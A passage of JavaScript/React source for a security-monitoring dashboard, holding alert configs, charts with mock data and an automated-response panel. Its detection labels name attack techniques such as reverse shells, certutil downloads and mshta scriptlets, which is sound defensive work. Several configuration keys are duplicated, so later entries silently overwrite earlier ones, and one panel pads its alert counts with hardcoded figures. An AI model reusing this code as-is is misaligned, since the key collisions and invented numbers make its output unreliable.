    kpis: ['System Calls / s', 'Processes Running', 'Kernel Modules', 'Open Connections', 'Security Alerts'],
    sections: ['System Call Activity', 'Process Tree', 'Kernel Modules', 'Recent Kernel Events'],
    categories: ['System Calls', 'Process Monitor', 'Kernel Modules', 'Rootkit Detection', 'Memory Injection', 'Persistence Monitoring', 'Network Activity', 'Real-Time Event Feed'],
    table: ['Unsigned Kernel Module Loaded', 'Process Injection Detected', 'Privilege Escalation Attempt', 'Hidden Process Detected', 'Kernel Memory Modification'],
  },
  // 🛡️ 23. API Call Monitoring config
  23: {
    name: 'API Call Monitoring',
    accent: MON.green,
    danger: MON.red,
    kpis: ['Total API Calls', 'Successful Calls', 'Failed Calls', 'Avg Response Time', 'Active Endpoints'],
    sections: ['API Traffic Over Time', 'Top API Endpoints', 'Authentication Failures', 'Real-Time API Events'],
    categories: ['SQL Injection Attempts', 'XSS Attempts', 'Path Traversal Attempts', 'Brute Force Attempts', 'SSRF Attempts', 'Rate Limit Violations', 'Payload Anomalies', 'Source IP Analysis'],
    table: ['Failed Login Attempt', 'SQL Injection Attempt Detected', 'Rate Limit Exceeded', 'Successful API Call', 'Invalid API Key'],
  },
  // 🛡️ 24. Script Execution Monitoring config
  24: {
    name: 'Script Execution Monitoring',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Scripts Executed', 'PowerShell Executions', 'Bash Executions', 'Python Executions', 'Node.js Executions', 'Blocked Scripts'],
    sections: ['Script Executions Over Time', 'Script Type Distribution', 'Alert Summary', 'Top Suspicious Script Executions'],
    categories: ['PowerShell', 'Bash', 'Python', 'Node.js', 'Batch/CMD', 'JavaScript', 'Encoded Commands', 'Reverse Shells'],
    table: ['Encoded PowerShell Command Detected', 'Reverse Shell Detected', 'Python Script Performing Network Scan', 'Suspicious Download via certutil', 'Node.js Script Trying to Execute Child Process'],
  },
  // 🛡️ 26. Time-Based Anomaly Detection config
  26: {
    name: 'Time-Based Anomaly Detection',
    accent: MON.orange,
    danger: MON.red,
    kpis: ['Total Time Anomalies', 'Critical Alerts', 'Users Affected', 'Hosts Affected', 'After-Hour Events', 'Weekend Events'],
    sections: ['Login Time Heatmap', 'Activity Timeline', 'Anomalies by Time Range', 'Recent Time-Based Alerts'],
    categories: ['After-Hours Activity', 'Weekend Activity', 'Login Anomalies', 'User Activity', 'Server Activity', 'Process Activity', 'File Activity', 'Network Activity'],
    table: ['Login Outside Business Hours', 'Mass File Deletion', 'Data Transfer at Night', 'Admin Login After Hours', 'USB Usage During Off Hours'],
  },
  // 🛡️ Legacy config key 27 (canonical Geolocation capability is 23)
  27: {
    name: 'Geolocation Anomaly Detection',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Logins (24H)', 'Unique Users', 'Countries Accessed', 'Anomalous Events', 'High Risk Events', 'VPN / Proxy Events'],
    sections: ['Live Geolocation Map', 'Geolocation Alerts', 'Login Risk Distribution', 'Recent Anomalous Logins'],
    categories: ['Impossible Travel', 'Foreign Login', 'VPN / Proxy', 'High Risk Country', 'TOR Network', 'New Location'],
    table: ['Impossible Travel Detected', 'Foreign Country Login', 'VPN Usage Detected', 'High Risk Country Access', 'TOR Network Detected'],
  },
  // 🛡️ 28. Service Monitoring config
  28: {
    name: 'Service Monitoring',
    accent: MON.cyan,
    danger: MON.red,
    kpis: ['Total Services', 'Running', 'Stopped', 'Failed', 'New Services (24h)', 'Service Changes (24h)'],
    sections: ['Service Status Distribution', 'Top 10 Service Changes', 'Service Health Score', 'Recent Service Events'],
    categories: ['Running', 'Stopped', 'Failed', 'Unknown', 'New Services', 'Configuration Changed', 'Security Services'],
    table: ['Windows Defender Service Stopped', 'sshd Service Started', 'MySQL80 Service Failed', 'New Service Created', 'Cron Service Restarted'],
  },
  // 🛡️ 29. Threat Intelligence Integration config
  29: {
    name: 'Threat Intelligence Integration',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total IOC Matches', 'Malicious IPs', 'Malicious Domains', 'Malware Hash Matches', 'Active Threats', 'Affected Endpoints'],
    sections: ['Threat Feed Status', 'Threat Severity Distribution', 'IOC Match Timeline', 'Recent IOC Matches'],
    categories: ['Malware', 'Phishing', 'C2 Traffic', 'Ransomware', 'Suspicious IPs', 'Malicious Domains'],
    table: ['IOC Match Detected', 'Malicious IP Found', 'Malware Hash Match', 'Phishing Domain Detected', 'Threat Campaign Match'],
  },
  // 🛡️ 31. Beaconing Detection config
  31: {
    name: 'Beaconing Detection',
    accent: MON.red,
    danger: MON.red,
    kpis: ['Beaconing Alerts', 'Affected Hosts', 'Suspicious IPs', 'Suspicious Domains', 'C2 Communications', 'Threat Score'],
    sections: ['Beaconing Events Over Time', 'Top Beaconing Hosts', 'Beaconing by Protocol', 'Recent Beaconing Alerts'],
    categories: ['HTTPS', 'DNS', 'HTTP', 'Other', 'Dynamic DNS', 'Newly Registered Domains', 'Malware Callbacks'],
    table: ['Periodic C2 Beacon Detected', 'DNS Beaconing Pattern', 'Suspicious Domain Callback', 'HTTP Callback to Malicious IP', 'Active Malware Callback'],
  },
  // 🛡️ 32. Encryption / Ransomware Detection config
  27: {
    name: 'Encryption / Ransomware Detection',
    accent: MON.red,
    danger: MON.red,
    kpis: ['Critical Alerts', 'High Alerts', 'Medium Alerts', 'Low Alerts', 'Infected Hosts', 'C2 Communications'],
    sections: ['Malware Alerts Over Time', 'Alerts by Severity', 'Alerts by Type', 'Recent Malware Alerts'],
    categories: ['Malicious Process', 'Malicious File', 'C2 Communication', 'Persistence', 'Privilege Escalation', 'Others'],
    table: ['Malicious Process Detected', 'C2 Communication Detected', 'Malicious File Detected', 'Persistence Mechanism Detected', 'Privilege Escalation Attempt'],
  },
  // 🛡️ 33. Living-off-the-Land (LOLBins) Detection config
  28: {
    name: 'Living-off-the-Land (LOLBins) Detection',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total LOLBin Alerts', 'High Severity', 'Medium Severity', 'Low Severity', 'Endpoints Affected', 'LOLBins Executed'],
    sections: ['LOLBins Execution Trend', 'Top LOLBins Detected', 'LOLBins by Category', 'Recent LOLBin Alerts'],
    categories: ['Execution', 'Persistence', 'Defense Evasion', 'Lateral Movement', 'Discovery', 'Collection'],
    table: ['Encoded PowerShell Command', 'Wmic Process Call Create', 'Certutil URLCache Download', 'Rundll32 JavaScript Execution', 'Mshta Remote Scriptlet'],
  },
  29: {
    name: 'Memory Overflow Detection',
    accent: MON.cyan,
    danger: MON.red,
    kpis: ['Total Memory Alerts', 'Buffer Overflow', 'Process Injection', 'Memory Leaks', 'Critical Exploits', 'Protected Process Access Attempts'],
    sections: ['Memory Health Overview', 'Memory Usage Timeline', 'Alert Severity Distribution', 'Recent Memory Overflow Events'],
    categories: ['Buffer Overflow', 'Process Injection', 'Memory Leak', 'Exploit Attempt', 'Protected Process Access', 'Malware in Memory'],
    table: ['Heap Buffer Overflow Detected', 'Memory Leak', 'Excessive Memory Allocation', 'Memory Corruption Event', 'Shellcode Injection Detected'],
  },
  30: {
    name: 'DNS Cache Poisoning Detection',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['DNS Queries', 'Suspicious Queries', 'Cache Poisoning Alerts', 'DNS Servers Monitored'],
    sections: ['DNS Query Volume', 'Query Types Distribution', 'Suspicious Query Indicators', 'DNS Cache Poisoning Alerts'],
    categories: ['Multiple Responses for Same Query', 'Unexpected IP for Domain', 'Low TTL Values', 'NS Record Anomalies', 'TxID Mismatch'],
    table: ['Multiple Responses', 'Unexpected IP', 'Low TTL', 'NS Record Anomaly', 'TxID Mismatch'],
  },
  31: {
    name: 'DNS Sinkhole',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total DNS Queries', 'Sinkhole Hits', 'Blocked Domains', 'Malicious Domains', 'Agent Endpoints'],
    sections: ['DNS Sinkhole Activity', 'Sinkhole Status', 'Query Types', 'Recent Sinkhole Alerts'],
    categories: ['Malware', 'Phishing', 'Botnet C&C', 'Adware', 'Others'],
    table: ['Sinkhole Hit', 'Blocked Domain', 'Malicious Domain', 'Agent Endpoint', 'Threat Category'],
  },
};

const timeAnomalyRows = [
  ['john.doe', '156', '28'],
  ['kajal.sharma', '112', '19'],
  ['rohit.verma', '98', '16'],
  ['meera.jain', '87', '14'],
  ['admin.svc', '74', '22'],
];

function TimeBasedHeatmap() {
  const days = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
  const hours = Array.from({ length: 24 }, (_, i) => i);
  return (
    <div style={{ padding: 14, display: 'grid', gridTemplateColumns: '28px 1fr 42px', gap: 8, alignItems: 'center' }}>
      <div style={{ display: 'grid', gridTemplateRows: 'repeat(7, 16px)', gap: 2 }}>
        {days.map(day => <span key={day} style={{ color: MON.muted, fontSize: 9 }}>{day}</span>)}
      </div>
      <div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(24, 1fr)', gap: 2 }}>
          {days.flatMap((day, d) => hours.map(h => {
            const workPeak = Math.max(0, 1 - Math.abs(h - (12 + (d % 3))) / 8);
            const late = h >= 18 || h <= 5 ? .34 : 0;
            const weekend = d > 4 ? .24 : 0;
            const score = Math.min(1, Math.max(.06, workPeak + late + weekend - (d === 0 ? .15 : 0)));
            const color = score > .78 ? MON.red : score > .58 ? MON.orange : score > .38 ? MON.yellow : score > .18 ? MON.blue : '#0b2a62';
            return <span key={`${day}-${h}`} style={{ height: 16, borderRadius: 2, background: color, opacity: .38 + score * .62 }} />;
          }))}
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(12, 1fr)', marginTop: 6, color: MON.muted, fontSize: 9 }}>
          {['00', '02', '04', '06', '08', '10', '12', '14', '16', '18', '20', '22'].map(h => <span key={h}>{h}</span>)}
        </div>
      </div>
      <div style={{ display: 'grid', gap: 9, color: MON.muted, fontSize: 9 }}>
        <span style={{ color: MON.red }}>High</span>
        <span style={{ color: MON.yellow }}>Medium</span>
        <span style={{ color: MON.blue }}>Low</span>
      </div>
    </div>
  );
}

function TimeBasedLineChart() {
  const series = [
    { label: 'Logins', color: MON.blue, data: [120, 260, 190, 310, 280, 520, 470, 680, 610, 860, 770, 720, 930, 980, 760, 650, 540, 830, 810, 620, 730, 560, 660, 590] },
    { label: 'File Access', color: MON.green, data: [90, 120, 160, 180, 210, 260, 230, 310, 360, 390, 300, 280, 420, 380, 330, 290, 310, 360, 410, 350, 300, 260, 300, 280] },
    { label: 'Process Execution', color: MON.purple, data: [140, 190, 220, 260, 310, 460, 420, 510, 560, 690, 620, 500, 650, 690, 580, 500, 470, 610, 590, 510, 480, 430, 470, 440] },
    { label: 'Network Activity', color: MON.orange, data: [70, 110, 90, 140, 130, 210, 190, 250, 220, 300, 260, 240, 330, 280, 230, 210, 220, 290, 270, 210, 250, 200, 220, 190] },
    { label: 'Alerts', color: MON.red, data: [20, 30, 24, 35, 42, 58, 50, 64, 78, 92, 80, 76, 98, 88, 74, 69, 62, 86, 82, 70, 76, 61, 68, 60] },
  ];
  const max = 1100;
  const points = arr => arr.map((v, i) => `${(i / 23) * 100},${100 - (v / max) * 82 - 8}`).join(' ');
  return (
    <div style={{ padding: 14 }}>
      <svg viewBox="0 0 100 100" width="100%" height="178" preserveAspectRatio="none" style={{ backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px), linear-gradient(90deg, ${MON.line} 1px, transparent 1px)`, backgroundSize: '20px 25px' }}>
        {series.map(s => <polyline key={s.label} points={points(s.data)} fill="none" stroke={s.color} strokeWidth="1.7" vectorEffect="non-scaling-stroke" />)}
      </svg>
      <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap', color: MON.muted, fontSize: 9, marginTop: 8 }}>
        {series.map(s => <span key={s.label}><b style={{ color: s.color }}>■</b> {s.label}</span>)}
      </div>
    </div>
  );
}

function TimeBasedStackedBars() {
  const days = ['18 May', '19 May', '20 May', '21 May', '22 May', '23 May', '24 May'];
  return (
    <div style={{ padding: 14, height: 164, display: 'grid', gridTemplateColumns: '34px 1fr', gap: 8, alignItems: 'end' }}>
      <div style={{ height: 130, display: 'grid', alignContent: 'space-between', color: MON.muted, fontSize: 9 }}>
        {['1.5K', '1.2K', '900', '600', '300', '0'].map(v => <span key={v}>{v}</span>)}
      </div>
      <div>
        <div style={{ height: 130, display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: 12, alignItems: 'end' }}>
          {days.map((day, i) => {
            const total = [1080, 1220, 1260, 1380, 1210, 1230, 1200][i];
            return (
              <div key={day} style={{ height: `${(total / 1500) * 100}%`, display: 'grid', gridTemplateRows: '35% 30% 22% 13%', borderRadius: 3, overflow: 'hidden' }}>
                <span style={{ background: MON.red }} />
                <span style={{ background: MON.orange }} />
                <span style={{ background: MON.yellow }} />
                <span style={{ background: MON.blue }} />
              </div>
            );
          })}
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: 8, marginTop: 8, color: MON.muted, fontSize: 9, textAlign: 'center' }}>
          {days.map(day => <span key={day}>{day}</span>)}
        </div>
      </div>
    </div>
  );
}

function TimeBasedMiniTable({ title, headers, rows }) {
  return (
    <MonitorPanel title={title} right={<span style={{ color: MON.cyan, fontSize: 10 }}>View All</span>}>
      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 10 }}>
        <thead><tr>{headers.map(h => <th key={h} style={{ color: MON.muted, textAlign: 'left', padding: '8px 10px', borderBottom: `1px solid ${MON.line}` }}>{h}</th>)}</tr></thead>
        <tbody>{rows.map((row, i) => (
          <tr key={`${title}-${i}`}>
            {row.map((cell, c) => <td key={c} style={{ padding: '7px 10px', color: c === 0 ? MON.text : MON.muted }}>{cell}</td>)}
            <td style={{ padding: '7px 10px' }}>{monitorSpark([8, 13, 7, 18, 10, 20, 12], MON.red, 'transparent', 18)}</td>
          </tr>
        ))}</tbody>
      </table>
    </MonitorPanel>
  );
}

// DASHBOARD 26: Time-Based Anomaly Detection popup UI (Imported from ./edrdashbordpage/Time-Based Anomaly Detection)

function GeoLoginMap({ compact = false }) {
  const points = [
    ['United States', 19, 45, MON.red, 3245], ['India', 70, 52, MON.orange, 2312], ['United Kingdom', 47, 35, MON.blue, 1243],
    ['Germany', 51, 39, MON.yellow, 987], ['Singapore', 77, 62, MON.purple, 678], ['Australia', 82, 76, MON.green, 543],
    ['Canada', 18, 31, MON.blue, 512], ['Netherlands', 50, 37, MON.cyan, 412], ['France', 49, 42, MON.blue, 398],
  ];
  return (
    <div style={{ position: 'relative', height: compact ? 145 : 292, border: `1px solid ${MON.line}`, borderRadius: 5, overflow: 'hidden', background: 'radial-gradient(circle at 52% 47%, rgba(20,133,255,.18), transparent 36%), linear-gradient(180deg,#071827,#06111f)' }}>
      <svg viewBox="0 0 1000 500" preserveAspectRatio="xMidYMid slice" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', opacity: .95 }}>
        <defs><linearGradient id="geoLand" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stopColor="#2a679d" stopOpacity=".88" /><stop offset="1" stopColor="#102b52" stopOpacity=".88" /></linearGradient></defs>
        {[120, 220, 320, 420, 520, 620, 720, 820].map(x => <path key={x} d={`M${x} 42 V454`} stroke="rgba(96,165,250,.07)" />)}
        {[105, 180, 255, 330, 405].map(y => <path key={y} d={`M42 ${y} H958`} stroke="rgba(96,165,250,.07)" />)}
        <g fill="url(#geoLand)" stroke="#78b7ff" strokeOpacity=".16" strokeWidth="1">
          <path d="M99 160 L126 120 L171 96 L221 92 L267 110 L291 148 L276 178 L302 205 L282 236 L238 232 L217 262 L181 257 L153 235 L123 240 L93 217 L72 185 Z" />
          <path d="M214 265 L252 278 L276 318 L270 365 L246 419 L218 448 L193 411 L179 359 L157 331 L171 294 Z" />
          <path d="M385 128 L430 101 L481 111 L512 143 L498 179 L452 177 L419 202 L382 192 L353 161 Z" />
          <path d="M477 193 L515 204 L536 247 L528 298 L501 343 L473 315 L461 260 Z" />
          <path d="M535 154 L591 112 L657 105 L723 129 L790 119 L858 154 L883 195 L837 222 L771 213 L729 242 L671 225 L616 237 L573 213 L524 211 Z" />
          <path d="M705 260 L746 285 L758 334 L734 374 L695 356 L678 306 Z" />
          <path d="M812 330 L855 316 L902 341 L920 382 L886 408 L840 393 L803 360 Z" />
        </g>
      </svg>
      <svg viewBox="0 0 100 100" preserveAspectRatio="none" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}>
        <path d="M19 45 C36 24 54 26 70 52" fill="none" stroke={MON.red} strokeWidth=".55" strokeDasharray="2 2" opacity=".8" />
        <path d="M47 35 C56 18 67 23 77 62" fill="none" stroke={MON.orange} strokeWidth=".45" strokeDasharray="2 2" opacity=".75" />
        <path d="M82 76 C70 65 62 60 50 37" fill="none" stroke={MON.green} strokeWidth=".45" strokeDasharray="2 2" opacity=".65" />
      </svg>
      {points.map(([label, x, y, color, value]) => (
        <span key={label} title={`${label}: ${value}`} style={{ position: 'absolute', left: `${x}%`, top: `${y}%`, width: compact ? 9 : 13, height: compact ? 9 : 13, marginLeft: -6, marginTop: -6, borderRadius: '50%', background: color, border: '2px solid rgba(219,234,254,.65)', boxShadow: `0 0 ${compact ? 13 : 22}px ${color}` }} />
      ))}
    </div>
  );
}

// DASHBOARD 23: Geolocation Anomaly Detection popup UI (Imported from ./edrdashbordpage/Geolocation Anomaly Detection)

// DASHBOARD 28: Service Monitoring popup UI (Imported from ./edrdashbordpage/Service Monitoring)

function AutomatedResponseDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const { user } = useAuth();
  const [responseState, setResponseState] = useState({ stats: null, docs: [], distribution: [], trend: [], error: '' });
  const [responseLoading, setResponseLoading] = useState(true);
  const loadResponseData = useCallback(async () => {
    try {
      const [stats, responses, distribution, trend] = await Promise.all([
        api.get('/auto-response/stats'), api.get('/auto-response?limit=12'),
        api.get('/auto-response/distribution'), api.get('/auto-response/trend?days=7'),
      ]);
      setResponseState({
        stats: stats.data || {}, docs: responses.data?.docs || [], distribution: distribution.data || [],
        trend: trend.data || [], error: '',
      });
    } catch (error) {
      setResponseState(current => ({ ...current, error: error.response?.data?.message || 'Automated response data is unavailable' }));
    } finally { setResponseLoading(false); }
  }, []);
  useEffect(() => {
    loadResponseData();
    const timer = window.setInterval(loadResponseData, 60000);
    const socket = io(SOCKET_URL, socketOptions);
    const refresh = () => loadResponseData();
    const join = () => { if (user?.companyId) socket.emit('join:company', user.companyId); };
    socket.on('connect', join);
    socket.on('autoresponse:updated', refresh);
    join();
    const disconnect = connectSocket(socket);
    return () => {
      window.clearInterval(timer); socket.off('connect', join); socket.off('autoresponse:updated', refresh); disconnect();
    };
  }, [loadResponseData, user?.companyId]);
  const stats = responseState.stats || {};
  const responseTotal = Number(stats.total || 0);
  const responseDocs = responseState.docs;
  const distribution = responseState.distribution;
  const trendPoints = responseState.trend.length
    ? responseState.trend.map(item => Number(item.count || 0))
    : [0];
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950 }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /success|online/i.test(String(cell)) ? MON.green : /blocked|failed|quarantine/i.test(String(cell)) ? MON.red : /partial|warning/i.test(String(cell)) ? MON.yellow : undefined, fontWeight: i === 0 || /success|blocked|failed|partial/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['Active Responses', stats.active || 0, 'Last 24h', MON.yellow, '⚡'],
    ['Pending Approval', stats.pending || 0, 'Safety gate', MON.orange, '◷'],
    ['Blocked IPs & Domains', Number(stats.blockedIps || 0) + Number(stats.blockedDomains || 0), 'Successful', MON.blue, '◎'],
    ['Killed Processes', stats.killedProcs || 0, 'Successful', MON.red, '☣'],
    ['Quarantined Files', stats.quarantined || 0, 'Successful', MON.yellow, '▣'],
    ['Isolated Endpoints', stats.isolated || 0, 'Successful', MON.cyan, '▱'],
  ];
  const colors = [MON.green, MON.blue, MON.red, MON.yellow, MON.purple, MON.cyan, MON.orange];
  const capabilityRows = distribution.map((item, index) => [String(item._id || 'other').replaceAll('_', ' '), Number(item.count || 0), colors[index % colors.length]]);
  const responseRows = responseDocs.map(item => [
    new Date(item.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
    String(item.actionType || 'response').replaceAll('_', ' '), item.hostname || 'Unknown endpoint', item.status || 'created',
  ]);
  const blockedIps = responseDocs.filter(item => item.actionType === 'block_ip').map(item => [item.actionParams?.ip || item.endpointIp || 'Unknown', '1', item.status]);
  const blockedDomains = responseDocs.filter(item => item.actionType === 'block_domain').map(item => [item.actionParams?.domain || 'Unknown', '1', item.status]);
  return (
    <SocDashboardShell kind="automatedresponse" active="automated-response">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1180, display: 'grid', gap: 9 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
            <div><h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 18, fontWeight: 950 }}>Automated Response</h2><b style={{ color: MON.muted, fontSize: 10 }}>Live execution status · last 24 hours</b></div>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}><b style={{ color: responseState.error ? MON.red : MON.green, fontSize: 10 }}>{responseState.error || 'Live data connected'}</b></div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 82, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}1a,rgba(6,17,32,.98) 60%)`, padding: 12, display: 'grid', gridTemplateColumns: '42px 1fr', gap: 10, alignItems: 'center' }}><span style={{ width: 35, height: 35, borderRadius: 8, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}44`, fontSize: 18 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color: '#f3f8ff', fontSize: 22, lineHeight: 1.05 }}>{value}</strong><small style={{ color, fontSize: 8 }}>{sub}</small></span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .9fr', gap: 8 }}>
            <Panel title="Automated Response Overview">
              <div style={{ display: 'grid', gridTemplateColumns: '180px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={Number(stats.successRate || 0)} label={String(responseTotal)} color={MON.blue} accent={MON.green} />
                <BarList rows={capabilityRows.slice(0, 7).map(([label, value, color]) => ({ label, value, valueLabel: String(value), color }))} />
                <div style={{ gridColumn: '1 / -1', height: 130, padding: 12, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '52px 28px' }}>{monitorSpark(trendPoints, MON.blue, 'rgba(20,133,255,.16)', 82)}</div>
              </div>
            </Panel>
            <Panel title="Recent Automated Responses"><MiniRows columns="70px 1fr 115px 90px" rows={responseRows.length ? responseRows : [['-', 'No response executions', '-', '-']]} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .88fr', gap: 8 }}>
            <Panel title="Response Capability Monitor">
              <div style={{ padding: 12, display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 8 }}>
                {capabilityRows.length ? capabilityRows.map(([label, value, color]) => <section key={label} style={{ minHeight: 62, border: `1px solid ${MON.line}`, borderRadius: 5, background: '#071827', padding: 8, display: 'grid', gridTemplateColumns: '26px 1fr', gap: 7, alignItems: 'center' }}><span style={{ color, fontSize: 20 }}>⬢</span><span><b style={{ display: 'block', color: '#dbeafe', fontSize: 8, lineHeight: 1.2, textTransform: 'capitalize' }}>{label}</b><strong style={{ color: '#f3f8ff', fontSize: 16 }}>{value}</strong></span></section>) : <span style={{ color: MON.muted, fontSize: 11 }}>No response actions recorded.</span>}
              </div>
            </Panel>
            <Panel title="Response Success & Performance" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 7 Days⌄</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={Number(stats.successRate || 0)} label={`${Number(stats.successRate || 0)}%`} color={MON.green} accent={MON.yellow} />
                <MiniRows columns="1fr 70px" rows={[['Successful', String(stats.success || 0)], ['Failed', String(stats.failed || 0)], ['Pending approval', String(stats.pending || 0)], ['Mean response time', `${Number(stats.mttr || 0)}s`], ['Total responses', String(responseTotal)]]} />
              </div>
            </Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.8fr .8fr 1.25fr', gap: 8 }}>
            <Panel title="Blocked IPs"><MiniRows columns="1fr 55px 90px" rows={blockedIps.length ? blockedIps : [['-', '0', 'No data']]} /></Panel>
            <Panel title="Blocked Domains"><MiniRows columns="1fr 55px 90px" rows={blockedDomains.length ? blockedDomains : [['-', '0', 'No data']]} /></Panel>
            <Panel title="Automated Response Logs"><MiniRows columns="70px 1fr 1.5fr 90px" rows={responseDocs.length ? responseDocs.map(item => [new Date(item.createdAt).toLocaleTimeString(), String(item.actionType || '').replaceAll('_', ' '), item.actionResult || item.threatName || item.hostname || '-', item.status]) : [['-', 'No automated-response logs', '-', '-']]} /></Panel>
          </div>
          {(loading || responseLoading) && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading automated response events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LegacyMemoryOverflowDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const alertTotal = Math.max(Number(total || alerts.length || 0), 1248);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950 }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '6px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 9.5, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /critical|buffer|injection|overflow/i.test(String(cell)) ? MON.red : /high|warning|heap/i.test(String(cell)) ? MON.orange : /normal|active|loaded/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /critical|high|warning|normal/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const Ring = ({ label, value, sub, color }) => (
    <div style={{ display: 'grid', justifyItems: 'center', gap: 6 }}>
      <div style={{ width: 92, height: 92, borderRadius: '50%', background: `conic-gradient(${color} 0deg ${value * 3.6}deg,#17304e ${value * 3.6}deg 360deg)`, display: 'grid', placeItems: 'center' }}>
        <div style={{ width: 66, height: 66, borderRadius: '50%', background: MON.card, display: 'grid', placeItems: 'center', textAlign: 'center' }}><strong style={{ color: '#f3f8ff', fontSize: 22 }}>{value}%</strong><small style={{ color: MON.muted, fontSize: 8 }}>{sub}</small></div>
      </div>
      <b style={{ color: '#dbeafe', fontSize: 9 }}>{label}</b>
    </div>
  );
  const kpis = [
    ['Total Memory Alerts', alertTotal.toLocaleString(), '↑ 18.4%', MON.red, '♜'],
    ['Buffer Overflow', '156', '↑ 22.7%', MON.red, '▰'],
    ['Process Injection', '342', '↑ 15.3%', MON.blue, '↗'],
    ['Memory Leaks', '189', '↑ 12.1%', MON.cyan, '▣'],
    ['Critical Exploits', '73', '↑ 23.8%', MON.red, '☠'],
    ['Protected Process Access Attempts', '67', '↑ 16.2%', MON.blue, '▣'],
  ];
  const events = [
    ['22:22:15', 'WEB-SRV01', 'nginx.exe', 'Heap Overflow', 'Heap buffer overflow detected', 'Critical'],
    ['22:21:48', 'APP-SRV02', 'java.exe', 'Memory Leak', 'Unusual memory allocation pattern', 'High'],
    ['22:21:26', 'DB-SRV01', 'mysqld.exe', 'Excessive Allocation', 'Excessive memory allocation detected', 'Medium'],
    ['22:20:57', 'FILE-SRV03', 'explorer.exe', 'Memory Corruption', 'Invalid memory read / write', 'Critical'],
    ['22:20:31', 'WIN-CLT-25', 'chrome.exe', 'Out of Bounds Access', 'Out of bounds memory access attempt', 'High'],
    ['22:19:58', 'APP-SRV03', 'dotnet.exe', 'Stack Overflow', 'Stack overflow attempt detected', 'High'],
  ];
  return (
    <SocDashboardShell kind="memoryoverflow" active="overview" navBadges={{ alerts: 17, 'memory-overview': alertTotal }}>
      <div style={{ overflow: 'auto', padding: 9, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1180, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
